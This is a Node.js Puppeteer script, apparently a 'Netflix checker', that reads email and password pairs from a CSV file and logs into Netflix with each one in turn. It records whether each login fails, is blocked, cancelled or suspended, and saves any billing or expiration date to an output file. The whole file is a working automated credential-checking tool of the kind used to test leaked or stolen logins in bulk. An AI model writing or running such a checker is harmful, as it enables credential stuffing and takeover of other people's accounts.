const puppeteer = require("puppeteer");
const fs = require("fs");
const { parse } = require("csv-parse");

const acc = [];
fs.createReadStream("./netflix.csv")
  .pipe(
    parse({
      separator: ",",
    })
  )
  .on("data", (row) => acc.push(row));

function delay(time) {
  return new Promise(function (resolve) {
    setTimeout(resolve, time);
  });
}

function addCsv(email, comments) {
  const data = `${email},${comments}\n`;
  fs.appendFile("Out.csv", data, (err) => {
    if (err) throw err;
  });
}

(async () => {
  //Mensajes de bienvenida
  console.log("Bienvenido a Premium y Codigos Netflix Checker");
  console.log("Iniciamos proceso");
  console.log("***********");
  console.log("");
  console.log("");

  //Iniciamos proceso
  const browser = await puppeteer.launch({ headless: false }); //{ headless: false } );
  // const incognite = await browser.createIncognitoBrowserContext();
  const page = await browser.newPage();

  // Start Bucle
  for await (i of acc) {
    try {
      //Datos de acceso
      var email = i[0];
      var password = i[1];
      //Login Page
      await page.goto("https://netflix.com/clearcookies");
      await delay(500);
      await page.goto("https://www.netflix.com/cl/login", {
        waitUntil: "networkidle0",
      });

      //Login Email

      await page.click("#onetrust-close-btn-container > button");
      await page.waitForSelector("#\\:r0\\:");
      await page.click("#\\:r0\\:");
      await page.type("#\\:r0\\:", email);

      // Login Password
      await page.type("#\\:r3\\:", password);
      await page.click(
        "#appMountPoint > div > div > div.default-ltr-cache-8hdzfz.eyojgsc0 > div > form > button"
      );

      //Check if password error
      try {
        await page.waitForSelector(
          "#appMountPoint > div > div > div.default-ltr-cache-8hdzfz.eyojgsc0 > div > header > div > div > div",
          { timeout: 2000 }
        );
        console.log(`${email}: E-mail o Password Incorrecto`);
        addCsv(email, "E-mail o Password Incorrecto");
        continue;
      } catch (error) {
        {
        }
      }

      // Select Profile
      try {
        await page.waitForSelector(
          "#appMountPoint > div > div > div:nth-child(1) > div.bd.dark-background > div.profiles-gate-container > div > div > ul > li:nth-child(1) > div > a",
          { timeout: 2000 }
        );
        await page.click(
          "#appMountPoint > div > div > div:nth-child(1) > div.bd.dark-background > div.profiles-gate-container > div > div > ul > li:nth-child(1) > div > a"
        );
      } catch (error) {
        //Check if blocked
        try {
          blocked = await page.$eval("body > pre", (el) => el.textContent);
          console.log(`${email}: bloqueado, revisar nuevamente`);
          addCsv(email, "bloqueado, revisar nuevamente");
          continue;

          // Blocked
        } catch (error) {
          {
          }
        }

        //Check Deleted Account
        try {
          await page.waitForSelector(
            "#appMountPoint > div > div > div > div.simpleContainer > div > div.planContainer > div.stepHeader-container > div > h1",
            { timeout: 2000 }
          );
          var resuscribe = await page.$eval(
            "#appMountPoint > div > div > div > div.simpleContainer > div > div.planContainer > div.stepHeader-container > div > h1",
            (el) => el.textContent
          );
          console.log(`${email}: Suscripción cancelada totalmente`);
          addCsv(email, "Suscripción cancelada totalmente");
          continue;
        } catch (error) {
          {
          }
        }
      }

      //Check if Language selected
      await page.waitForNetworkIdle();
      try {
        var language = await page.$eval(
          "#appMountPoint > div > div > div > div.simpleContainer > div > div > div.onboarding-sidebar > div.stepHeader-container > div > h1",
          (el) => el.textContent
        );
      } catch (error) {
        var language = null;
      }
      if (language == "¿En qué idiomas te gusta ver las películas y series?") {
        await page.click(
          "#appMountPoint > div > div > div > div.nfHeader.noBorderHeader.signupBasicHeader.onboarding-header > a.svg-nfLogo.signupBasicHeader.onboarding-header"
        );
      }

      //Wait for error
      try {
        await page.waitForSelector(
          "body > div:nth-child(1) > div > div > div.nf-modal-content.css-0 > div > div > div.nf-modal-body > div > div.uma-modal-body",
          { timeout: 3000 }
        );
        var suspended = await page.$eval(
          "body > div:nth-child(1) > div > div > div.nf-modal-content.css-0 > div > div > div.nf-modal-body > div > div.uma-modal-body",
          (el) => el.textContent
        );
        console.log(`${email}: ${suspended}`);
        addCsv(email, suspended);
        continue;
      } catch (error) {
        {
        }
      }
      //Check Facturation Date
      await page.goto("https://www.netflix.com/account");
      // await page.waitForNetworkIdle()
      try {
        await page.waitForSelector(
          "#appMountPoint > div > div > div.uma > div > article > section > h2",
          { timeout: 3000 }
        );
        var suspended = await page.$eval(
          "#appMountPoint > div > div > div.uma > div > article > section > h2",
          (el) => el.textContent
        );
        console.log(`${email}: ${suspended}`);
        addCsv(email, suspended);
        continue;
      } catch (error) {
        {
        }
      }
      try {
        var expirationMessage = await page.$eval(
          "#appMountPoint > div > div > div > div.bd > div > div > div.billingSectionSpace > table > tbody > tr.retableHeading > th.col.billPeriod.nowrap",
          (el) => el.textContent
        );
        var expirationDate = await page.$eval(
          "#appMountPoint > div > div > div > div.bd > div > div > div.billingSectionSpace > table > tbody > tr:nth-child(2) > td.col.billPeriod",
          (el) => el.textContent
        );
        console.log(`${email}: ${expirationMessage} ${expirationDate}`);
        addCsv(email, `${expirationMessage} ${expirationDate}`);
        continue;
      } catch (error) {
        {
        }
      }
      try {
        /**
         * The expiration message obtained from the Netflix page.
         * @type {string}
         */

        var expirationMessage = await page.$eval(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(2) > div > div.default-ltr-cache-1cr1i8r.e19xx6v33 > p",
          (el) => el.textContent
        );
        console.log(`${email}: ${expirationMessage}`);
        addCsv(email, expirationMessage);
        continue;
      } catch (error) {
        console.error(`${email}: Hay problemas, revisar manual`);
        continue;
      }
    } catch (error) {
      await delay(1800000);
      addCsv(email, error);
      console.log(`${email}: ${error}`);
      continue;
    }
  }
  //Mensajes de Despedida
  console.log("");
  console.log("");
  console.log("***********");
  console.log("Terminando proceso...");
  browser.close();
  console.log("Termino correctamente");
})();
